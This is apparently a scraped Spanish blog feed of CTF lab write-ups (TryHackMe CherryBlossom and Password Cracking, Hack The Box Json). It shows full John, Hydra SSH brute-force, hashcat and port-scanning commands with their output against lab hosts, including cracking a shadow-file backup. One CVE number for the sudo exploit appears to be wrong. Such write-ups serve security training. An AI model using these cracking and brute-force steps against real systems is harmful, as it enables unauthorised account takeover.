OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:01:45 0.02% (ETA: 2020-02-29 18:28) 0g/s 26.33p/s 26.33c/s 26.33C/s puppy1..victoria1 t[... snip ...]y (Journal.ctz) 1g 0:00:03:40 DONE (2020-02-21 23:29) 0.004525g/s 25.34p/s 25.34c/s 25.34C/s brownsugar..inferno Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/cherryblossom# Extraemos el archivo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ➜ tmp 7z e Journal.ctz 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 70434 bytes (69 KiB) Extracting archive: Journal.ctz -- Path = Journal.ctz Type = 7z Physical Size = 70434 Headers Size = 146 Method = LZMA2:16 7zAES Solid = - Blocks = 1 Enter password (will not be echoed): Everything is Ok Size: 158136 Compressed: 70434 ➜ tmp ls Journal.ctd Journal.ctz ➜ tmp HYDRA - SSH Encontramos un archivo CTD, en su interior vemos un \u0026ldquo;diario\u0026rdquo; que pertenece a Johan, en donde explica que esta escribiendo un wordlist super seguro. Utilizamos el wordlist cherry-blossom.list con el usuario Lily junto con hydra y obtenemos la contraseña en el servicio SSH:\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@aoiri:~/tryhackme/cherryblossom# hydra -l lily -P wordlists/cherry-blossom.list ssh://10.10.76.210 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-21 23:44:12 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task [DATA] attacking ssh://10.10.76.210:22/ [STATUS] 102.00 tries/min, 102 tries in 00:01h, 9821 to do in 01:37h, 16 active [STATUS] 112.00 tries/min, 336 tries in 00:03h, 9587 to do in 01:26h, 16 active [22][ssh] host: 10.10.76.210 login: lily password: M[... snip ...]3 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-21 23:51:03 root@aoiri:~/tryhackme/cherryblossom# Logramos obtener una shell con el usuario lily:\nUSER - Johan Los archivos de backup siempre tienen cosas interesantes, en esta maquina encontramos un backup de las contraseñas de /etc/shadow, utilizamos john para crackear las contraseña de johan.\nUtilizamos el wordlist que encontramos antes:\n1 2 3 4 5 6 7 8 9 10 ➜ john shadow_hashes --wordlist=/home/sckull/vmware/share/ctf/tmp/wordlists/cherry-blossom.list Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:12 27% 0g/s 222.5p/s 452.9c/s 452.9C/s $hickory$..$happiness 0g 0:00:00:23 52% 0g/s 225.1p/s 454.5c/s 454.5C/s $3x!4l!f3..$20robyn06$ [... snip ...s] (johan) 1g 0:00:00:36 100% 0.02721g/s 270.0p/s 452.9c/s 452.9C/s #2lovely..#2little Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ➜ Cambiamos al usuario johan y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos sudo, pero notamos que al ingresar la contraseña, esta, se muestra en pantalla como asteriscos (esto nos recuerda a la maquina SUDO):\nUtilizamos el exploit de CVE-2019-18364 para explotar la vulnerabilidad de buffer overflow que tiene sudo:\nObtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"CherryBlossom es una maquina de TryHackMe, expone SMB donde encontramos una imagen codificada, por medio de esteganografia obtuvimos un wordlist y usuario, tras ejecutar Hydra a SSH obtuvimos acceso. Realizamos movimiento lateral crackeando la contraseña de un backup de shadow. Para escalar privilegios explotamos una vulnerabilidad en sudo.","id":159,"section":"posts","tags":["enum4linux","smbclient","xxd","steganography","stegpy","fcrackzip","sudo privesc","ctf like"],"title":"TryHackMe - CherryBlossom","uri":"https://sckull.github.io/posts/cherryblossom/"},{"content":"\rPassword Cracking de TryHackMe, presenta una serie de hashes las cuales crackeamos utilizando Hashcat y combinaciones de wordlist para obtener las credenciales.\nRoom Titulo Password Cracking Descripción Crack the password by using different techniques Puntos * Dificultad Media Maker F4_U57 Hashcat - Tutorial the basics of cracking password\nBruteforce MD5 En esta serie de retos se utilizará hashcat para poder obtener la flag de cada uno de los retos. La lista de caracteres que se utilizarán para obtener las flags:\n1 2 3 4 5 6 7 8 ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?h = 0123456789abcdef ?H = 0123456789ABCDEF ?s = «space»!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 – 0xff MD5 #1 Reto:\needb694a362f8ab2effbad5e4c8fa095 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. eedb694a362f8ab2effbad5e4c8fa095:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: eedb694a362f8ab2effbad5e4c8fa095 Time.Started.....: Tue Feb 18 20:32:56 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:32:56 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d [15] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 4765.5 kH/s (0.01ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 1000/1000 (100.00%) Rejected.........: 0/1000 (0.00%) Restore.Point....: 0/1000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-123 -\u0026gt; TRY-HACK-ME-573 Hardware.Mon.#1..: Temp: 53c Util: 16% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:32:51 2020 Stopped: Tue Feb 18 20:32:57 2020 sckull@uplifted:~/tools/hashcat$ MD5 #2 Reto:\needb694a362f8ab2effbad5e4c8fa095 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 19b489d1c4220946b38d65a7fce24372:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 19b489d1c4220946b38d65a7fce24372 Time.Started.....: Tue Feb 18 20:35:18 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:35:18 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d?d [16] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 13550.0 kH/s (0.12ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10000/10000 (100.00%) Rejected.........: 0/10000 (0.00%) Restore.Point....: 0/10000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-1234 -\u0026gt; TRY-HACK-ME-5739 Hardware.Mon.#1..: Temp: 55c Util: 15% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:35:15 2020 Stopped: Tue Feb 18 20:35:19 2020 sckull@uplifted:~/tools/hashcat$ MD5 #3 Reto:\n7353d3b528592ecd12139fba62c43287 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 7353d3b528592ecd12139fba62c43287:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 7353d3b528592ecd12139fba62c43287 Time.Started.....: Tue Feb 18 20:37:10 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:37:10 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d?d?d [17] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 17768.1 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 100000/100000 (100.00%) Rejected.........: 0/100000 (0.00%) Restore.Point....: 0/100000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-12345 -\u0026gt; TRY-HACK-ME-57397 Hardware.Mon.#1..: Temp: 56c Util: 63% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:37:07 2020 Stopped: Tue Feb 18 20:37:11 2020 sckull@uplifted:~/tools/hashcat$ Combination (MD5) En esta seccion nos proporcionan tres diccionarios los cuales debemos de combinar segun el reto que se presente, utilizamos combinator de hashcat, el cual utiliza dos diccionarios y los combina (diccionario1diccionario2) para poder crackear un hash.\nMD5 #1 Reto:\na united states city followed by 2 digits (all lowercase)\r0f8e6ad80411e27fc85ba1f79153dd8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt us-city.txt ?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: us-city.txt * Passwords.: 2011 * Bytes.....: 19099 * Keyspace..: 201100 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 0f8e6ad80411e27fc85ba1f79153dd8f:penn[... snip ...]ia46 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 0f8e6ad80411e27fc85ba1f79153dd8f Time.Started.....: Tue Feb 18 20:46:41 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:46:41 2020 (0 secs) Guess.Base.......: File (us-city.txt), Left Side Guess.Mod........: Mask (?d?d) [2], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 70748.6 kH/s (0.28ms) @ Accel:128 Loops:50 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 201100/201100 (100.00%) Rejected.........: 0/201100 (0.00%) Restore.Point....: 0/2011 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:50-100 Iteration:0-50 Candidates.#1....: alabama13 -\u0026gt; worland68 Hardware.Mon.#1..: Temp: 53c Util: 62% Core:1176MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:46:36 2020 Stopped: Tue Feb 18 20:46:42 2020 sckull@uplifted:~/tools/hashcat$ MD5 #2 Reto:\na united states city followed by a simple color, followed by 3 digits (all lowercase).\rfbd527693aceda78b30a978d7d3b9abb Combinator:\n./combinator.bin ../../us-city.txt ../../color.txt \u0026gt; ../../us-city-color.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt us-city-color.txt ?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: us-city-color.txt * Passwords.: 50275 * Bytes.....: 740916 * Keyspace..: 50275000 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. fbd527693aceda78b30a978d7d3b9abb:phoe[... snip ...]rple585 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: fbd527693aceda78b30a978d7d3b9abb Time.Started.....: Tue Feb 18 20:58:05 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:58:05 2020 (0 secs) Guess.Base.......: File (us-city-color.txt), Left Side Guess.Mod........: Mask (?d?d?d) [3], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 473.0 MH/s (5.50ms) @ Accel:128 Loops:62 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 24936400/50275000 (49.60%) Rejected.........: 0/24936400 (0.00%) Restore.Point....: 0/50275 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:434-496 Iteration:0-62 Candidates.#1....: alabamared925 -\u0026gt; worlandgrey405 Hardware.Mon.#1..: Temp: 49c Util: 56% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:58:02 2020 Stopped: Tue Feb 18 20:58:06 2020 sckull@uplifted:~/tools/hashcat$ MD5 #3 Reto:\na simple color followed by a country, followed by 4 digits (all lowercase).\ra4131ef4610be60c0c6a3656b00dd763 Combinator:\n./combinator.bin ../../color.txt ../../country.txt \u0026gt; ../../color-country.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt color-country.txt ?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: color-country.txt * Passwords.: 4775 * Bytes.....: 66846 * Keyspace..: 47750000 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. a4131ef4610be60c0c6a3656b00dd763:blue[... snip ...]7926 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: a4131ef4610be60c0c6a3656b00dd763 Time.Started.....: Tue Feb 18 21:00:36 2020 (0 secs) Time.Estimated...: Tue Feb 18 21:00:36 2020 (0 secs) Guess.Base.......: File (color-country.txt), Left Side Guess.Mod........: Mask (?d?d?d?d) [4], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 355.7 MH/s (0.63ms) @ Accel:128 Loops:64 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 35755200/47750000 (74.88%) Rejected.........: 0/35755200 (0.00%) Restore.Point....: 0/4775 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:7424-7488 Iteration:0-64 Candidates.#1....: redafghanistan9147 -\u0026gt; greyzimbabwe8479 Hardware.Mon.#1..: Temp: 55c Util: 87% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 21:00:33 2020 Stopped: Tue Feb 18 21:00:37 2020 sckull@uplifted:~/tools/hashcat$ Rainbow Table (NTLM) En esta seccion utilizaremos ophcrack para poder cracker los hashes utilizando un rainbow table. Ophcrack viene incluido en el sistema de Kali Linux, por lo que debemos de descargar unicamente el rainbow table XP special (8GB).\nRetos:\n1 2 3 FF6EDF5C42F0FE57AAD5360A07991BD6:A2F77301E3162DB9213E3DA35D5EA931 1CDEE68485E23D0E1DD9CED345A47D0C:D4F3A9ACC8448BC9EF7C53B3BBBEC9C3 8C7972A6362411C1B0D3662B97EBED58:DAE91036E4B2E7F0B5061956BCE39A3E Importamos los hashes a ophrack y esperamos el resultado:\n","description":"Password Cracking de TryHackMe presenta una serie de hashes las cuales crackeamos utilizando Hashcat y combinaciones de wordlist para obtener las credenciales.","id":160,"section":"posts","tags":["hashcat"],"title":"TryHackMe - Password Cracking","uri":"https://sckull.github.io/posts/password_cracking_thm/"},{"content":"\rDescubrimos una vulnerabilidad de deserializacion en Json.net y usando ysoserial obtuvimos una shell inversa. Vemos que el usuario tiene permisos SeImpersonatePrivilege con ello escalamos privilegios utilizando JuicyPotato en su version para PowerShell.\nInformacion de la Maquina Nombre Json OS Windows Puntos 30 Dificultad Media IP 10.10.10.158 Maker Cyb3rb0b\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.6, 7.9, 7.4, 2.6, 2.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 root@kali:~/htb/json# masscan -p1-65535,U:1-65535 10.10.10.158 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-30 22:56:02 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49153/tcp on 10.10.10.158 Discovered open port 445/tcp on 10.10.10.158 Discovered open port 5985/tcp on 10.10.10.158 Discovered open port 139/tcp on 10.10.10.158 Discovered open port 49155/tcp on 10.10.10.158 Discovered open port 135/tcp on 10.10.10.158 Discovered open port 47001/tcp on 10.10.10.158 Discovered open port 49157/tcp on 10.10.10.158 Discovered open port 21/tcp on 10.10.10.158 Discovered open port 49152/tcp on 10.10.10.158 # Nmap 7.80 scan initiated Mon Sep 30 19:14:28 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.158 Warning: 10.10.10.158 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.158 Host is up (0.23s latency). Not shown: 64567 closed ports, 954 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown # Nmap done at Mon Sep 30 19:19:17 2019 -- 1 IP address (1 host up) scanned in 289.09 seconds # Nmap 7.80 scan initiated Mon Sep 30 19:20:55 2019 as: nmap -p 21,80,135,139,445,5985,47001 -sV -sC -o services_script.nmap 10.10.10.158 Nmap scan report for 10.10.10.158 Host is up (0.56s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp open msrpc? 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h00m42s, deviation: 0s, median: 4h00m42s |_nbstat: NetBIOS name: JSON, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:bd:94:b0 (VMware) |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-10-01T03:24:25 |_ start_date: 2019-10-01T00:14:50 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 30 19:24:33 2019 -- 1 IP address (1 host up) scanned in 217.67 seconds FTP Intentamos logearnos al servicio ftp con el usuario y contraseña anonymous pero no esta autorizado el usuario, tambien podemos ver la version del servicio ftp.\nHTTP \u0026gt; GOBUSTER Algunos directorios y paginas encontradas con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.158 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/30 20:23:11 Starting gobuster =============================================================== /css /files /img /index.html /Index.html /index.html /js /login.html /Login.html /views =============================================================== 2019/09/30 20:35:16 Finished =============================================================== /index.html Visitamos el index de la 